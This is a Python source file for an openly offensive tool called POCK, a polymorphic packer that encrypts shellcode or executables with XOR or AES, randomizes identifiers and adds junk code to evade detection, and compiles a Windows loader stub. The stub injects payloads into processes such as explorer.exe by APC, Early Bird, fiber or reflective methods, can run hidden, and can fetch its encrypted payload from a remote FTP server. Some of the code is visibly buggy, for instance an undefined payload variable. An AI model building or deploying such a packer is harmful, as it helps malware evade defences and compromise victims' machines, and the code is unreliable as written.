import argparse
import os
import subprocess
import random
import string
from urllib.parse import urlparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def ascii():
    art = r"""
  ____   ___   ____ _  __
 |  _ \ / _ \ / ___| |/ /
 | |_) | | | | |   | ' / 
 |  __/| |_| | |___| . \ 
 |_|    \___/ \____|_|\_\
 
        *PACKER*
 
 By wcrooker                                  v1.2
"""
    print(art)


def xor_encrypt(data, key):
    key_bytes = key.encode()
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])

def aes_encrypt(data, key):
    key_bytes = key.encode()
    key_bytes = key_bytes.ljust(16, b'\0')[:16]
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv=b'\0'*16)
    return cipher.encrypt(pad(data, 16))

def random_identifier(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def generate_stub(payload_bytes, key, enc_algo, payload_type, url=None, embed_payload=True, ftp_user="anonymous", ftp_pass="", inject_method="apc", target_process=None, early_bird=False):
    if embed_payload:
        payload_array = ','.join(f'0x{b:02x}' for b in payload_bytes)
        payload_len = len(payload_bytes)
    else:
        payload_array = ''
        payload_len = 0

    with open("stub_template.c", "r") as f:
        stub_code = f.read()

    buf_name = random_identifier()
    size_name = random_identifier()
    capacity_name = random_identifier()
    junk_func = random_identifier()
    junk_var = random_identifier()

    stub_code = stub_code.replace("{{BUF_NAME}}", buf_name)
    stub_code = stub_code.replace("{{SIZE_NAME}}", size_name)
    stub_code = stub_code.replace("{{CAPACITY_NAME}}", capacity_name)

    junk_code = f"""
int {junk_func}() {{
    int {junk_var} = 0;
    for (int i = 0; i < 100; i++) {{
        {junk_var} += i;
    }}
    return {junk_var};
}}
"""
    stub_code = stub_code.replace("// {{JUNK}}", junk_code)

    stub_code = stub_code.replace("{{PAYLOAD_ARRAY}}", payload_array)
    stub_code = stub_code.replace("{{PAYLOAD_SIZE}}", str(payload_len))
    stub_code = stub_code.replace("{{KEY}}", f'"{key}"')
    stub_code = stub_code.replace("{{ENC_ALGO}}", f'"{enc_algo}"')
    stub_code = stub_code.replace("{{PAYLOAD_TYPE}}", f'"{payload_type}"')
    stub_code = stub_code.replace("{{FTP_USER}}", ftp_user)
    stub_code = stub_code.replace("{{FTP_PASS}}", ftp_pass)

    if inject_method == "apc":
        stub_code = stub_code.replace("{{INJECT_METHOD_CALL}}", "inject_APC(buf, len);")
    if early_bird:
        stub_code = "#define EARLY_BIRD_MODE 1\n" + stub_code
    else:
        stub_code = "#define EARLY_BIRD_MODE 0\n" + stub_code

    if url:
        parsed_url = urlparse(url)
        ip = parsed_url.hostname
        path = parsed_url.path.lstrip('/')
        port = parsed_url.port or 21
        stub_code = stub_code.replace("{{IP}}", ip)
        stub_code = stub_code.replace("{{PORT}}", str(port))
        stub_code = stub_code.replace("{{PATH}}", path)
    else:
        stub_code = stub_code.replace("{{IP}}", "")
        stub_code = stub_code.replace("{{PORT}}", "0")
        stub_code = stub_code.replace("{{PATH}}", "")

    # Injection method specific replacements
    if inject_method == "apc":
        stub_code = stub_code.replace("{{INJECT_METHOD_CALL}}", "inject_APC(buf, len);")
    elif inject_method == "winfiber":
        target_pid = target_process if target_process else "explorer.exe"
        stub_code = stub_code.replace("{{INJECT_METHOD_CALL}}", f"inject_WinFiber({target_pid}, buf, len);")
    elif inject_method == "indirect":
        stub_code = stub_code.replace("{{INJECT_METHOD_CALL}}", "IndirectInject(buf, len);")
        stub_code = "#define USE_INDIRECT\n" + stub_code

    os.makedirs("build", exist_ok=True)
    with open("build/stub.c", "w") as f:
        f.write(stub_code)

def compile_stub(output, payload_type, debug=False, hide=False, embed=False, inject_method=None):
    with open("stub_template.c", "r") as f:
        stub_template = f.read()
    cmd = [
        "x86_64-w64-mingw32-gcc",
        "-m64",
        "-Os",
        "-Iindirect_injection"
    ]

    if debug:
        cmd.append("-DDEBUG")

    if embed:
        # Write payload into stub
        payload_array = ','.join([f"0x{b:02x}" for b in payload_data])
        stub_code = stub_template.replace("{{PAYLOAD_ARRAY}}", payload_array)
        stub_code = stub_code.replace("{{PAYLOAD_SIZE}}", str(len(payload_data)))
        stub_code = stub_code.replace("wchar_t IP[64] = L\"{{IP}}\";", "wchar_t IP[64] = L\"\";")
        stub_code = stub_code.replace("wchar_t PATH[128] = L\"{{PATH}}\";", "wchar_t PATH[128] = L\"\";")
    else:
        # Staged build (external download)
        stub_code = stub_template.replace("{{PAYLOAD_ARRAY}}", "")
        stub_code = stub_code.replace("{{PAYLOAD_SIZE}}", "0")

    if hide:
        cmd.append("-mwindows")
    else:
        cmd.append("-mconsole")

    cmd.append("build/stub.c")

    # Only add indirect injection support if it's requested
    if inject_method == "indirect":
        cmd.append("indirect_injection/GetReflectiveLoaderOffset.c")

    cmd += [
        "-o", output,
        "-lwininet",
        "-lpsapi",
        "-lbcrypt"
    ]

    print(f"[+] Compiling stub: {' '.join(cmd)}")
    subprocess.run(cmd, check=True)


def main():
    parser = argparse.ArgumentParser(description="POCK: A Polymorphic hardened AES/XOR packer")
    parser.add_argument("-i", "--input", required=True, help="Input file (exe or shellcode)")
    parser.add_argument("-o", "--output", required=True, help="Output packed executable")
    parser.add_argument("-t", "--type", required=True, choices=["shellcode", "exe", "dll"], help="Payload type")
    parser.add_argument("-e", "--encrypt", required=True, choices=["xor", "aes"], help="Encryption algorithm")
    parser.add_argument("-k", "--key", required=True, help="Encryption key")
    parser.add_argument("--url", help="Optional remote URL for staged payload (ftp:// preferred)")
    parser.add_argument("--bin", help="Output file for external payload (default payload.bin if --url used)")
    parser.add_argument("--ftp-user", default="anonymous", help="FTP username")
    parser.add_argument("--ftp-pass", default="", help="FTP password")
    parser.add_argument("--hide", action="store_true", help="Compile stub with -mwindows for hidden execution")
    parser.add_argument("--inject", choices=["apc", "indirect", "winfiber"], default="apc", help="Injection method")
    parser.add_argument("--target-process", help="Target process name for indirect injection (e.g., notepad.exe)")
    parser.add_argument("--early-bird", action="store_true", help="Enable Early Bird APC injection")
    parser.add_argument("--embed", action="store_true", help="Embed payload directly into stub (disable staging)")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode for stub")
    args = parser.parse_args()

    print(f"[+] Loading input file: {args.input}")
    with open(args.input, "rb") as f:
        data = f.read()

    print(f"[+] Input size: {len(data)} bytes")
    print(f"[+] Using encryption: {args.encrypt.upper()}")
    print(f"[+] Payload type: {args.type}")
    print(f"[+] Injection method: {args.inject}")

    if args.encrypt == "xor":
        encrypted = xor_encrypt(data, args.key)
    else:
        encrypted = aes_encrypt(data, args.key)

    if args.url:
        bin_output = args.bin if args.bin else "payload.bin"
        with open(bin_output, "wb") as f:
            f.write(encrypted)
            print(f"[+] Writing encrypted payload to external file: {bin_output}")
            print(f"[+] Staging details:")
            print(f"[+] URL: {args.url}")
            print(f"[+] FTP user: {args.ftp_user}")

        generate_stub(
            encrypted, 
            args.key, 
            args.encrypt, 
            args.type, 
            url=args.url, 
            embed_payload=False, 
            ftp_user=args.ftp_user, 
            ftp_pass=args.ftp_pass, 
            inject_method=args.inject, 
            target_process=args.target_process,
            early_bird=args.early_bird
        )
    else:
        print("[+] Embedding payload directly into stub")
        generate_stub(
            encrypted, 
            args.key, 
            args.encrypt, 
            args.type, 
            embed_payload=True, 
            ftp_user=args.ftp_user, 
            ftp_pass=args.ftp_pass, 
            inject_method=args.inject, 
            target_process=args.target_process
        )

    embed = args.embed

    print(f"[+] Preparing to compile stub: {args.output}")
    compile_mode = "Hidden (-mwindows)" if args.hide else "Console (-mconsole)"
    print(f"[+] Compile mode: {compile_mode}")
    compile_stub(
        output=args.output,
        payload_type=args.type,
        debug=args.debug,
        hide=args.hide,
        embed=embed,
        inject_method=args.inject
    )
    print(f"[✓] Packing complete: {args.output}")

if __name__ == "__main__":
    ascii()
    main()
